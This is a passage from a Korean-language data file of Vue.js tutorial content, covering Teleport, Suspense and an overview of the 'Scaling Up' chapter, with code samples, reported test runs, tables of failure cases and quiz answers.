        body: "<Teleport to=\"body\"><div v-if=\"open\" class=\"modal\">…</div></Teleport>. to: 선택자 문자열 또는 DOM 요소. 왜: 모달이 깊은 컴포넌트 안에 있으면 조상의 position/overflow/z-index/transform에 갇힙니다. body 자식으로 옮기면 자유. '타깃은 Teleport 마운트 시점에 DOM에 있어야 한다. 컴포넌트 자신이 렌더하는 요소는 불가(이미 그 뒤이므로)'. 3.5+ defer: <Teleport defer to=\"#late\">는 같은 마운트/갱신 틱의 나중 요소를 타깃으로 허용(mounted처럼 동작). 논리 관계: '텔레포트된 콘텐츠도 논리적으로는 Teleport를 쓴 컴포넌트의 자식'. props·emits·inject·DevTools가 그대로. disabled: <Teleport :disabled=\"isMobile\">로 제자리 렌더와 전환. 다중: 같은 타깃에 여러 Teleport면 마운트 순서로 뒤에 추가(한 컨테이너 안에 전부). SSR: 텔레포트 내용은 렌더 문자열에 없고 ctx.teleports[selector]에 모임. 'body 타깃은 피할 것'(하이드레이션 불일치). in-DOM은 <teleport>. API: to(필수), disabled, defer(3.5+).",
        code: "<!-- 깊은 컴포넌트 안에서 -->\n<button @click=\"open = true\">Open Modal</button>\n<Teleport to=\"body\" :disabled=\"isMobile\">        <!-- 타깃은 먼저 있어야 · disabled 면 제자리 -->\n  <div v-if=\"open\" class=\"modal\">\n    <p>Hello from the modal!</p>\n    <button @click=\"open = false\">Close</button>   <!-- 상태 · emit · inject 전부 그대로 -->\n  </div>\n</Teleport>\n\n<!-- 3.5+ 같은 틱의 나중 요소 -->\n<Teleport defer to=\"#late-target\">…</Teleport>\n<div id=\"late-target\"></div>\n\n// SSR — 따로 모아서 끼운다\nconst ctx = {}; const html = await renderToString(app, ctx)\nctx.teleports   // { '#modal': '<!--teleport start anchor--><div class=\"modal\">…</div><!--teleport anchor-->' }",
        terms: [
          {
            term: "논리 트리와 DOM 트리",
            body: "논리 트리는 컴포넌트가 누구의 자식인가(props·emit·provide/inject·슬롯·DevTools)이고, DOM 트리는 요소가 어디에 붙어 있나입니다. 보통 둘은 같은 모양이지만 Teleport가 둘을 갈라놓습니다. 내용은 DOM에서 타깃 안에 있고, 논리에서는 Teleport를 쓴 컴포넌트의 자식입니다. 그래서 inject가 되고(실제로 확인) 상태 변경이 그대로 반영됩니다. React의 포털이 같은 자리이고, 이벤트 버블링도 논리 트리(Vue는 네이티브 DOM 이벤트는 DOM 트리를 따르니 Teleport 밖 부모의 @click은 안 받지만 컴포넌트 emit은 받음)를 따릅니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 부모가 provide('msg', '부모가 provide')하고 <div id=\"tp-parent\"><Teleport to=\"#modal-target\" :disabled=\"disabled\"><Inner/></Teleport></div>를 렌더했습니다. #modal-target의 textContent는 '부모가 provide'(Inner가 inject한 값). 부모 div 안에는 <!--teleport start--><!--teleport end--> 주석 둘만. disabled를 true로 바꾸니 Inner가 부모 안으로 돌아오고 타깃은 비었습니다. 존재하지 않는 #nope를 타깃으로 하니 경고 둘: '[Vue warn]: Failed to locate Teleport target with selector \"#nope\". Note the target element must exist before the component is mounted - i.e. the target cannot be rendered by the component itself, and ideally should be outside of the entire Vue component tree.'와 'Invalid Teleport target on mount:'. Node의 renderToString에서 <Teleport to=\"#modal\"><span>텔레포트</span></Teleport>는 본문에 <!--teleport start--><!--teleport end-->만 남기고 ctx.teleports는 { '#modal': '<!--teleport start anchor--><span>텔레포트</span><!--teleport anchor-->' }였습니다. 서버는 타깃을 모르니 모아만 두고 끼우는 것은 프레임워크의 일입니다.",
        code: "// Chrome 156\n#modal-target.textContent → '부모가 provide'            (Teleport 안 Inner 가 inject)\n#tp-parent.innerHTML      → '<!--teleport start--><!--teleport end-->'\ndisabled = true           → Inner 가 부모 안으로 · 타깃 ''\nto=\"#nope\" (없음)\n  → warn: Failed to locate Teleport target with selector \"#nope\". Note the target element must exist before the component is mounted - i.e. the target cannot be rendered by the component itself, and ideally should be outside of the entire Vue component tree.\n  → warn: Invalid Teleport target on mount:\n\n// Node — SSR\nrenderToString → '<div>…<!--teleport start--><!--teleport end-->…</div>'\nctx.teleports  → { '#modal': '<!--teleport start anchor--><span>텔레포트</span><!--teleport anchor-->' }",
      },
      {
        label: "문제: 모달이 카드 안에서 잘린다",
        body: "상품 카드 컴포넌트 안의 '자세히' 버튼이 모달을 띄웁니다. 카드에 overflow: hidden과 transform이 있어 모달이 카드 안에서 잘리고 z-index도 안 먹습니다. position: fixed도 transform 조상 때문에 카드 기준이 됩니다. 처방은 <Teleport to=\"body\">로 모달 DOM을 body 끝에 옮기는 것입니다. 논리적으로는 여전히 카드의 자식이라 카드의 상태(open), emit, provide된 값을 그대로 쓰고(실제로 inject 확인), 닫기 버튼이 카드의 open을 false로 바꿉니다. 타깃 body는 늘 존재하니 안전하고, SSR을 쓴다면 body 대신 <div id=\"teleported\">를 레이아웃에 두고 그것을 타깃으로 합니다(문서의 SSR 경고). 접근성(포커스 트랩, Esc)은 Teleport가 해 주지 않으니 모달 컴포넌트가 챙깁니다.",
      },
      {
        label: "문제가 나는 경우: 타깃과 트리를 모를 때",
        body: "경우 ㄱ, 조상에 갇힘입니다. 위의 사고입니다. 경우 ㄴ, 타깃이 없음. 경고(실제로)·렌더 안 됨. 먼저 있는 요소. 경우 ㄷ, 타깃을 같은 컴포넌트가 렌더. 마운트 시점에 없음. 3.5+ defer 또는 밖으로. 경우 ㄹ, 타깃이 v-if로 사라짐. 내용도 사라짐·에러. 늘 있는 타깃. 경우 ㅁ, Teleport 밖 부모의 @click(네이티브)이 안 옴. DOM 이벤트는 DOM 트리. 컴포넌트 emit은 옴. 경우 ㅂ, Teleport 안 요소에 부모의 scoped style 기대. 논리 자식이라 scoped 속성은 붙지만 조상 선택자(.card .modal)는 DOM상 조상이 아니라 안 맞음. 경우 ㅅ, SSR에서 body 타깃. 하이드레이션 불일치. 전용 컨테이너. 경우 ㅇ, SSR에서 ctx.teleports를 안 끼움. 내용 누락. 프레임워크 또는 수동 삽입. 경우 ㅈ, 여러 모달이 같은 타깃에 쌓이는 순서. 마운트 순. z-index로. 경우 ㅊ, 모바일에선 제자리여야 함. :disabled. 경우 ㅋ, Teleport를 루트로 둔 컴포넌트에 폴스루 class. 자리 없음(경고 문구에 teleport root). 안쪽 요소에. 경우 ㅌ, in-DOM <Teleport>. 소문자. 경우 ㅍ, 포커스·Esc·aria를 Teleport가 해 줄 거라 기대. 안 함. 모달 컴포넌트에서.",
        code: "경우               언제 생기나                        겉모습                                        처방\nㄱ 조상에 갇힘       overflow·transform 조상               잘림 · z-index 무력                            <Teleport to=\"body\">\nㄴ 타깃 없음        to=\"#nope\"                         Failed to locate Teleport target… (실제로)        먼저 있는 요소\nㄷ 자기 타깃        같은 컴포넌트가 렌더                  마운트 시점에 없음                               defer (3.5+) · 밖으로\nㄹ 타깃 v-if       사라짐                              내용 소실                                      늘 있는 타깃\nㅁ 네이티브 버블링    Teleport 밖 부모 @click              DOM 트리 따라 안 옴                             emit\nㅂ 조상 선택자       .card .modal                        DOM 조상 아님                                  모달 자체 선택자\nㅅ SSR body        to=\"body\"                          하이드레이션 불일치                               전용 컨테이너\nㅇ teleports 미삽입   ctx.teleports 무시                  내용 누락                                      끼우기\nㅈ 쌓임 순서        같은 타깃 여럿                        마운트 순                                      z-index\nㅊ 모바일 제자리     조건부 이동                          -                                            :disabled\nㅋ Teleport 루트 폴스루  class 넘김                       자리 없음                                      안쪽 요소\nㅌ in-DOM 대문자     <Teleport> in HTML                  소문자 됨                                      <teleport>\nㅍ 접근성 기대       포커스 트랩 등                        안 함                                         모달에서",
        codeLang: "text",
      },
      {
        label: "문제의 구조: Teleport 는 'DOM 자리' 만 바꾸고 '논리 자리' 는 두기 때문에, 둘이 다를 때 각각을 따르는 것이 갈린다",
        body: "Teleport가 바꾸는 것은 DOM 트리에서의 위치 하나입니다. 그래서 DOM 위치를 따르는 것은 바뀝니다. CSS 상속·조상 선택자·overflow·z-index(ㄱ, ㅂ), 네이티브 이벤트 버블링(ㅁ), 하이드레이션의 자리(ㅅ, ㅇ). 논리 위치를 따르는 것은 그대로입니다. 상태·props·emit·provide/inject·DevTools·폴스루 규칙(ㅋ). 타깃은 Teleport 바깥의 DOM이라 Teleport가 마운트될 때 이미 있어야 하고(ㄴ, ㄷ, ㄹ), 서버에는 DOM이 없어 '모아 두기'만 합니다(ㅇ). 처방은 '이 성질은 DOM을 따르나 논리를 따르나'를 묻고, DOM을 따르는 것(스타일·네이티브 이벤트·접근성 ㅍ)은 모달 쪽에서 직접 챙기는 것입니다.",
        code: "Teleport = DOM 자리 ↔ 논리 자리 분리\n  DOM 따름 (바뀜):  CSS 상속·조상 선택자·overflow·z-index (ㄱ ㅂ) · 네이티브 버블링 (ㅁ) · 하이드레이션 자리 (ㅅ ㅇ) · 접근성 (ㅍ)\n  논리 따름 (그대로): 상태 · props · emit · provide/inject · DevTools · 폴스루 (ㅋ)\n타깃 = 바깥 DOM → 마운트 전에 존재 (ㄴ ㄷ ㄹ · defer 3.5+) · 서버는 ctx.teleports 에 모아만 (ㅇ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "내장 컴포넌트의 마지막 'Suspense'는 비동기 자손이 준비될 때까지 기다리는 실험적 컴포넌트입니다. 실제로 돌려 보면 첫 렌더는 fallback, 이벤트는 pending → fallback → resolve였고, 서버 렌더는 기다려서 완성된 HTML을 냈습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) Nuxt(SSR) 앱의 토스트 알림을 Teleport로 띄우려 합니다. 타깃을 어디에 두고 왜? (2) 토스트 컴포넌트가 inject한 테마 값과 부모가 넘긴 @close가 Teleport 뒤에도 동작할까요? (3) 토스트 컨테이너를 같은 레이아웃 컴포넌트가 렌더하는데 'Failed to locate Teleport target'이 납니다. 왜고 어떻게?",
        notes: [
          {
            title: "답",
            body: "(1) body가 아니라 레이아웃에 둔 전용 요소 <div id=\"teleports\"></div>를 타깃으로 합니다. 문서는 SSR에서 body 타깃을 피하라고 적습니다. 서버는 텔레포트 내용을 본문에 넣지 않고 ctx.teleports['#teleports']에 모으므로(실제로 확인), 프레임워크(Nuxt는 자동)가 그 자리에 끼우고 클라이언트가 같은 자리에 하이드레이션해야 불일치가 없습니다. body는 다른 스크립트가 자식을 바꿀 수 있어 어긋나기 쉽습니다. (2) 됩니다. Teleport는 DOM 자리만 바꾸고 논리 트리는 그대로라 inject와 emit은 부모와 이어져 있습니다(실제로 Teleport 안 inject가 부모 provide를 받음). 안 되는 것은 DOM을 따르는 쪽입니다. 부모 요소의 네이티브 @click 버블링이나 .parent .toast 같은 조상 선택자. (3) 타깃은 Teleport가 마운트되는 시점에 DOM에 있어야 하는데, 같은 컴포넌트가 렌더하는 요소는 그 시점에 아직 없습니다(경고 문구가 그 경우를 명시). 3.5+면 <Teleport defer to=\"#teleports\">로 같은 틱의 나중 요소를 허용하거나, 타깃을 Vue 트리 바깥(index.html의 정적 요소)에 두거나, 타깃을 렌더하는 컴포넌트보다 아래(나중에 마운트)에서 Teleport를 씁니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Teleport", href: `${DOCS}/guide/built-ins/teleport` },
      { label: "<Teleport> (API)", href: `${DOCS}/api/built-in-components#teleport` },
      { label: "SSR — Teleports", href: `${DOCS}/guide/scaling-up/ssr#teleports` },
    ],
  },

  {
    id: "vg-bi-suspense",
    name: "Suspense",
    tagline: "비동기 자손이 준비될 때까지 fallback — async setup 과 비동기 컴포넌트만 잡는 실험적 경계",
    intro:
      "내장 컴포넌트 마지막 페이지입니다. <Suspense>는 자손 트리의 비동기 의존(async setup, <script setup>의 최상위 await, 비동기 컴포넌트)이 전부 끝날 때까지 #fallback을 보이고, 끝나면 #default를 보이는 경계입니다. 문서의 경고: '실험적 기능. 안정 상태에 이르는 것이 보장되지 않고 API가 바뀔 수 있다'. 상태는 pending(fallback)과 resolved(default). 깊은 곳의 새 비동기 의존은 pending으로 되돌리지 않고, 루트 노드가 교체될 때만 되돌립니다(timeout으로 옛 내용 유지 시간). 이벤트 pending·resolve·fallback. 에러 처리는 없어 부모의 onErrorCaptured로. Transition·KeepAlive·RouterView와의 중첩 순서가 정해져 있고, 3.3+ 중첩 Suspense는 suspensible. Vue Router의 지연 라우트는 Suspense를 깨우지 않습니다. 실제로 돌려 보면 async setup(80ms) 자식을 둔 Suspense의 첫 렌더는 '로딩…', 150ms 뒤 '비동기 setup 끝', 이벤트 순서 pending → fallback → resolve였고, 서버 렌더는 기다려 <b>비동기 도착</b>을 냈습니다. 이 노드의 질문은 하나입니다. 무엇을 기다리고 무엇은 못 기다리나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "<Suspense><Dashboard /><template #fallback>Loading...</template></Suspense>. 비동기 의존 둘: '비동기 setup() 훅을 가진 컴포넌트(<script setup>의 최상위 await 포함)'와 '비동기 컴포넌트'(defineAsyncComponent. 기본 suspensible이라 Suspense가 로딩을 맡고 자기 loading/error 옵션은 무시. suspensible: false로 끄기). 슬롯 #default와 #fallback은 '각각 직접 자식 하나'. 상태: 처음 pending으로 fallback. 자손 비동기가 전부 끝나면 resolved로 default. '깊은 곳에 새 비동기 의존이 생겨도 pending으로 안 돌아감. 루트 노드 교체 때만'. 교체 시 timeout 동안 옛 내용 유지, timeout=\"0\"이면 즉시 fallback. 이벤트 @pending @resolve @fallback. 에러: '자체 처리 없음. errorCaptured/onErrorCaptured를 Suspense의 부모에'. 조합 순서(문서 예): <RouterView v-slot=\"{ Component }\"><template v-if=\"Component\"><Transition mode=\"out-in\"><KeepAlive><Suspense><component :is=\"Component\" /><template #fallback>Loading...</template></Suspense></KeepAlive></Transition></template></RouterView>. 'Vue Router의 동적 import 지연 라우트는 Suspense를 깨우지 않음'. 중첩(3.3+): 안쪽 <Suspense suspensible>로 바깥에 위임해 빈 노드 깜빡임 방지.",
        code: "<Suspense @pending=\"log('pending')\" @resolve=\"log('resolve')\" @fallback=\"log('fallback')\" timeout=\"300\">\n  <Dashboard />                              <!-- async setup / 최상위 await / 비동기 컴포넌트 -->\n  <template #fallback>Loading...</template>\n</Suspense>\n\n<!-- Dashboard.vue — 최상위 await → async setup -->\n<script setup>\nconst res = await fetch('/api/dashboard')     // Suspense 가 기다린다\nconst data = await res.json()\n</script>\n\n<!-- 에러는 부모에서 -->\n<script setup>onErrorCaptured((e) => { error.value = e; return false })</script>\n\n<!-- 조합 순서 -->\n<RouterView v-slot=\"{ Component }\"><template v-if=\"Component\">\n  <Transition mode=\"out-in\"><KeepAlive><Suspense>\n    <component :is=\"Component\" /><template #fallback>Loading...</template>\n  </Suspense></KeepAlive></Transition>\n</template></RouterView>\n\n<!-- 중첩 (3.3+) -->\n<Suspense><component :is=\"Outer\"><Suspense suspensible><DynamicAsyncInner /></Suspense></component></Suspense>",
        terms: [
          {
            term: "비동기 의존 (async dependency)",
            body: "Suspense가 '아직'이라고 인식하는 것 둘입니다. async setup()(또는 <script setup>의 최상위 await. 컴파일러가 async setup으로 바꿈)과 defineAsyncComponent의 로딩. 이 둘만 Suspense가 기다립니다. onMounted 안의 fetch, watchEffect의 비동기, Vue Router의 지연 라우트 import는 Suspense가 모릅니다. React의 Suspense가 use(프라미스)와 lazy만 잡는 것과 같은 자리입니다. 최상위 await를 쓰는 컴포넌트는 반드시 Suspense 안에 있어야 합니다(경고).",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 async setup() { await wait(80); return { msg } }인 Slow를 <Suspense @pending @resolve @fallback><Slow/><template #fallback><i>로딩…</i></template></Suspense>에 두었습니다. 마운트 직후 textContent '로딩…', 150ms 뒤 '비동기 setup 끝'. 이벤트 로그는 ['pending', 'fallback', 'resolve']. 비동기 컴포넌트는 Suspense 밖에서는 자기 loadingComponent/errorComponent를 썼습니다(비동기 컴포넌트 노드). Node의 renderToString에서 async setup 자식을 Suspense로 감싸니 서버가 15ms를 기다려 <b>비동기 도착</b>을 완성 HTML에 넣었고 fallback은 나오지 않았습니다. 서버 렌더는 Suspense를 '기다림'으로 처리합니다(React의 renderToString이 fallback을 내는 것과 다름). <script setup>의 최상위 await는 compileScript가 async setup()으로 컴파일하며 문서는 'Suspense와 함께 써야 하고 Suspense는 아직 실험적'이라고 경고합니다. 라이프사이클 노드에서 mounted는 '동기 자식'만 보장하고 Suspense 안 자식은 제외라는 것도 이와 맞습니다.",
        code: "// Chrome 156\n<Suspense><Slow (async setup 80ms)/><template #fallback>로딩…</template></Suspense>\n마운트 직후 '로딩…' → 150ms 뒤 '비동기 setup 끝'\n이벤트: pending → fallback → resolve\n\n// Node — SSR 은 기다린다\nrenderToString(<Suspense><AsyncChild (15ms)/></Suspense>) → <b>비동기 도착</b>   (fallback 없음)\n\n// <script setup> 최상위 await → compileScript: async setup()  (Suspense 필수 · 실험적 경고)",
      },
      {
        label: "문제: 라우트 컴포넌트에 최상위 await 를 썼는데 아무것도 안 그려진다",
        body: "<script setup>에 const data = await load()를 썼습니다. 컴포넌트가 async setup이 되었는데 조상에 Suspense가 없어 Vue가 기다릴 경계를 못 찾고 렌더가 비거나 경고가 납니다. 최상위 await를 쓰는 컴포넌트는 Suspense 안에 있어야 합니다. 처방은 둘입니다. RouterView를 문서의 순서대로 감쌉니다. <RouterView v-slot=\"{ Component }\"><Suspense><component :is=\"Component\"/><template #fallback>…</template></Suspense></RouterView>. 실제로 돌려 보면 Suspense 안의 async setup은 fallback 뒤 내용으로 바뀌었습니다. 또는 Suspense가 실험적이라는 점이 부담이면 await를 쓰지 않고 onMounted에서 fetch해 ref에 담고 v-if로 로딩을 그립니다. 그 경우 Suspense는 필요 없습니다. 에러는 Suspense가 안 잡으니 부모에 onErrorCaptured를 둡니다.",
      },
      {
        label: "문제가 나는 경우: 경계와 의존을 모를 때",
        body: "경우 ㄱ, Suspense 없는 최상위 await입니다. 위의 사고입니다. 경우 ㄴ, onMounted의 fetch를 Suspense가 기다릴 거라 기대. 모름. async setup 또는 v-if 로딩. 경우 ㄷ, Router 지연 라우트 import가 Suspense를 깨울 거라 기대. 안 깨움(문서). 컴포넌트의 async setup으로. 경우 ㄹ, fallback에 요소 둘. 직접 자식 하나. 감싸기. 경우 ㅁ, 에러를 Suspense가 잡길 기대. 안 잡음. 부모 onErrorCaptured. 경우 ㅂ, 비동기 컴포넌트의 loading/error 옵션이 Suspense 안에서 무시됨. suspensible 기본. 끄려면 suspensible: false. 경우 ㅅ, 깊은 곳 비동기가 pending으로 되돌릴 거라 기대. 루트 교체만. 경우 ㅇ, 루트 교체 때 옛 내용이 바로 fallback으로. timeout 기본 동작은 옛 내용 유지. timeout=\"0\"이면 즉시. 경우 ㅈ, Transition·KeepAlive·Suspense 순서 바꿈. 문서 순서(Transition > KeepAlive > Suspense). 경우 ㅊ, 중첩 Suspense에서 빈 노드 깜빡임. 안쪽 suspensible(3.3+). 경우 ㅋ, 부모 mounted에서 Suspense 안 자식 DOM 기대. 보장 밖. @resolve. 경우 ㅌ, 실험적 API에 깊이 의존. 바뀔 수 있음. 최소 범위. 경우 ㅍ, SSR에서 fallback이 나올 거라 기대. 서버는 기다림(실제로).",
        code: "경우               언제 생기나                        겉모습                                 처방\nㄱ 경계 없음        최상위 await · Suspense 없음           빈 렌더 · 경고                           Suspense · 또는 onMounted fetch\nㄴ Effect fetch     onMounted 안 fetch                   기다리지 않음                            async setup · v-if 로딩\nㄷ 지연 라우트       () => import() 라우트                깨우지 않음                              async setup\nㄹ fallback 둘      요소 둘                             에러                                   하나로 감싸기\nㅁ 에러 기대        자식 throw                           잡지 않음                               부모 onErrorCaptured\nㅂ 옵션 무시        Suspense 안 defineAsync               loading/error 안 쓰임                     suspensible: false\nㅅ 깊은 pending     자손에 새 비동기                      pending 안 됨 (설계)                      -\nㅇ 즉시 fallback 기대  루트 교체                          옛 내용 유지 (timeout)                    timeout=\"0\"\nㅈ 순서 혼동        KeepAlive > Transition …             전환·캐시 어긋남                          Transition > KeepAlive > Suspense\nㅊ 중첩 깜빡임       안쪽 Suspense                        빈 노드                                  suspensible (3.3+)\nㅋ mounted 기대     부모 mounted 에서 자식 DOM             없음                                   @resolve\nㅌ 실험 의존        전역 사용                            API 변경 위험                             최소 범위\nㅍ SSR fallback 기대  서버 렌더                           기다려 완성 (실제로)                       -",
        codeLang: "text",
      },
      {
        label: "문제의 구조: Suspense 는 'setup 이 Promise 를 돌려주는 자손' 을 세는 경계라, 그 모양이 아닌 비동기는 보이지 않는다",
        body: "Suspense가 하는 일은 자손 중 '비동기로 셋업되는' 것을 세고 전부 끝나면 resolve하는 것입니다. 셀 수 있는 것은 setup이 Promise를 돌려주는 컴포넌트(async setup·최상위 await)와 비동기 컴포넌트 로딩만입니다(ㄱ, ㄴ, ㄷ, ㅂ). 세는 단위가 '트리의 루트 교체'라 깊은 곳의 새 비동기는 다시 세지 않고(ㅅ) 교체 때는 옛 내용을 timeout 동안 둡니다(ㅇ). 경계는 시간만 다루고 에러는 다루지 않으며(ㅁ), 슬롯은 각각 하나(ㄹ)입니다. 서버에는 '보여 주는 시간'이 없어 그냥 기다립니다(ㅍ). 다른 래퍼와의 순서는 '전환 → 캐시 → 기다림 → 컴포넌트'로 바깥이 안쪽의 결과를 받는 순서입니다(ㅈ). 처방은 기다릴 것을 async setup 모양으로 두고, 에러 경계를 부모에 따로 두고, 실험적임을 감안해 범위를 좁히는 것입니다.",
        code: "Suspense = 자손 중 { async setup · 최상위 await · 비동기 컴포넌트 } 를 센다 (ㄱ ㄴ ㄷ ㅂ)\n  전부 끝 → resolve · 루트 교체만 다시 pending (ㅅ) · 교체 시 옛 내용 timeout 동안 (ㅇ)\n  시간만 · 에러 X (ㅁ) · 슬롯 각 하나 (ㄹ) · 서버는 기다림 (ㅍ)\n순서: Transition > KeepAlive > Suspense > component (ㅈ)\n\n기다릴 것 → async setup 모양 · 에러 → 부모 onErrorCaptured · 실험적 → 좁게",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "내장 컴포넌트가 끝났습니다. 다음 장 '확장하기'는 앱이 커질 때의 여섯 주제, SFC·툴링·라우팅·상태 관리·테스트·SSR입니다. 실제로 돌려 보면 SSR에서 모듈 전역 상태가 요청 사이에 누적됐고, 서버에서는 반응성 추적이 꺼졌으며, 하이드레이션 불일치 경고와 data-allow-mismatch를 확인했습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 대시보드 페이지가 위젯 셋을 가지고 각 위젯이 자기 데이터를 await로 받습니다. 하나의 Suspense로 감쌀까요, 위젯마다? (2) 위젯 하나의 API가 실패하면 그 위젯만 에러 표시하고 나머지는 보여야 합니다. 어떻게? (3) 라우트 전환에서 새 페이지의 데이터를 기다리는 동안 옛 페이지를 유지하고 싶습니다. 어떤 설정?",
        notes: [
          {
            title: "답",
            body: "(1) 위젯마다 <Suspense>로 감싸면 각자 fallback을 보이고 먼저 끝난 것부터 나타납니다. 하나로 감싸면 가장 느린 위젯까지 전부 fallback입니다(React의 Suspense 경계와 같은 논리). 깊은 곳의 새 비동기는 바깥 Suspense를 다시 pending으로 돌리지 않으므로, 위젯이 나중에 바뀌는 경우도 위젯 단위 경계가 맞습니다. 3.3+면 안쪽에 suspensible을 두어 첫 로드는 바깥이 한 번에 기다리고 이후 교체는 안쪽이 맡게 할 수 있습니다. (2) Suspense는 에러를 잡지 않습니다. 위젯을 감싸는 작은 래퍼 컴포넌트(ErrorBoundary.vue)에서 onErrorCaptured((e) => { error.value = e; return false })로 잡아 에러 UI를 그리고 false로 전파를 끊습니다. 래퍼가 <Suspense>를 안에 두면 위젯 하나의 실패가 그 래퍼 안에서 끝납니다. (3) <RouterView v-slot=\"{ Component }\"><Suspense timeout=\"0\">…</Suspense>가 아니라 timeout을 두지 않거나 길게 둡니다. Suspense는 루트가 교체될 때 timeout 동안 옛 내용을 유지하고 그 안에 새 비동기가 끝나면 fallback 없이 바뀝니다(timeout=\"0\"이면 즉시 fallback). 전환까지 넣으려면 <Transition mode=\"out-in\"><KeepAlive><Suspense>의 순서로 감싸고, 라우트의 지연 import는 Suspense를 깨우지 않으니 데이터 대기는 컴포넌트의 async setup으로 둡니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Suspense", href: `${DOCS}/guide/built-ins/suspense` },
      { label: "<Suspense> (API)", href: `${DOCS}/api/built-in-components#suspense` },
      { label: "<script setup> — Top-level await", href: `${DOCS}/api/sfc-script-setup#top-level-await` },
    ],
  },

  {
    id: "vg-scaling",
    name: "확장하기",
    tagline: "앱이 커질 때의 여섯 주제: SFC, 툴링, 라우팅, 상태 관리, 테스트, SSR",
    intro:
      "가이드의 여섯째 장, 여섯 페이지입니다. 싱글 파일 컴포넌트(왜 .vue인가), 툴링(Vite·IDE·vue-tsc·Vitest·ESLint), 라우팅(Vue Router와 손으로 만든 최소 라우터), 상태 관리(reactive 스토어와 Pinia), 테스트(단위·컴포넌트·E2E), 서버 사이드 렌더링(createSSRApp·renderToString·하이드레이션과 그 함정). 앞 장들이 컴포넌트 하나·둘의 이야기라면 이 장은 수십 수백이 될 때의 구조입니다. 실제로 돌려 보면 SSR에서 모듈 전역 reactive가 요청 사이에 누적됐고(shared=1 → 2), 서버에서는 watchEffect가 초기 1회만 돌았으며(추적 꺼짐), 서버 HTML과 다른 텍스트를 하이드레이션하니 'Hydration text content mismatch' 경고와 'Hydration completed but contains mismatches.' 에러가 났고 data-allow-mismatch를 둔 요소는 경고가 없었으며, 템플릿 문자열을 가진 컴포넌트도 서버에서 컴파일되어 렌더됐습니다.",
    blocks: [
      {
        label: "여섯 페이지 한눈에",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "페이지              핵심 한 줄                                                   실제로 돌려 본 것\n1 싱글 파일 컴포넌트  템플릿·로직·스타일을 한 파일에 · 컴파일되어 ES 모듈로 · 관심사 분리 ≠ 파일 분리   compileScript · compileStyle 출력 (매크로 치환 · data-v 해시)\n2 툴링              Vite 권장 · Vue - Official · vue-tsc · Vitest · eslint-plugin-vue · 런타임 전용 빌드    브라우저 빌드 576KB(컴파일러 포함) vs 운영 178KB\n3 라우팅            클라이언트 라우팅 = History API · Vue Router 공식 · 최소 라우터는 hashchange + <component :is>   (문서 예제)\n4 상태 관리          reactive 스토어 모듈 · SSR 에선 요청 간 오염 · Pinia 권장                      모듈 reactive shared 1 → 2 (요청 간 누적)\n5 테스트            단위(Vitest) · 컴포넌트(Vue Test Utils) · E2E(Playwright/Cypress) · '무엇을' 테스트    (문서)\n6 SSR               createSSRApp · renderToString · 하이드레이션 · 서버는 반응성 꺼짐 · 생명주기 일부 · 불일치   추적 꺼짐 (runs 1) · 훅 serverPrefetch 만 · 'Hydration text content mismatch' · data-allow-mismatch ✓ · ctx.teleports",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 커지면 '어디서 돌고(환경), 누가 들고(소유), 어떻게 확인하나(검증)' 가 갈린다",
        body: "여섯 페이지는 세 축입니다. 환경: 빌드(SFC·툴링)는 코드가 컴파일되는 곳, SSR은 코드가 두 번(서버·브라우저) 도는 곳이라 '서버에 없는 것'(DOM, 추적, 요청 격리)이 사고입니다. 소유: 상태 관리는 '이 상태를 누가 들고 누가 바꾸나'(컴포넌트 → 스토어 → 요청별 인스턴스), 라우팅은 'URL을 누가 들고 화면과 어떻게 맞추나'. 검증: 테스트는 '무엇을(동작) 어느 층(단위·컴포넌트·E2E)에서' 확인하나. 자식 여섯이 각각입니다.",
        code: "환경   SFC · 툴링 (빌드 때 컴파일) · SSR (서버 + 브라우저 두 번 → 서버에 없는 것: DOM · 추적 · 요청 격리)\n소유   상태 관리 (누가 들고 바꾸나 → 요청별) · 라우팅 (URL 과 화면)\n검증   테스트 (무엇을 · 어느 층에서)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 '싱글 파일 컴포넌트'부터입니다.",
      },
    ],
    sources: [
      { label: "Single-File Components", href: `${DOCS}/guide/scaling-up/sfc` },
      { label: "Server-Side Rendering", href: `${DOCS}/guide/scaling-up/ssr` },
    ],
  },

  {
    id: "vg-scale-sfc",
    name: "싱글 파일 컴포넌트",
    tagline: ".vue 하나에 템플릿·로직·스타일 — 컴파일러가 ES 모듈로 바꾼다",
    intro:
      "확장하기 첫 페이지입니다. SFC(*.vue)는 '컴포넌트의 템플릿·로직·스타일을 한 파일에 담는 특수 파일 형식'이고 SPA·SSG·'사소하지 않은 모든 프런트엔드'에 권장됩니다. 이유: 템플릿을 미리 컴파일해 런타임 비용 없음, 컴포넌트 범위 CSS, <script setup>의 편의, 컴파일 타임 최적화, IDE 타입 검사, HMR. 동작: @vue/compiler-sfc가 표준 ES 모듈로 컴파일(Vite·Vue CLI가 통합), <style>은 개발에서 <style> 태그로 주입하고 운영에서 추출. '관심사 분리는 파일 타입 분리와 같지 않다'. 빌드 없는 대안은 petite-vue, 파일을 나누려면 src import. 실제로 돌려 보면 compileScript가 defineProps·defineModel·defineExpose를 props·emits 선언과 __props·__expose 호출로 바꿨고, compileStyle(scoped)이 .a를 .a[data-v-abc123]으로, :deep(.b)를 .a[data-v-abc123] .b로, v-bind(size)를 var(--abc123-size)로 바꿨습니다. 이 노드의 질문은 하나입니다. .vue 파일은 무엇으로 변하나.",
    blocks: [
      {
        label: "무엇을 다루나",
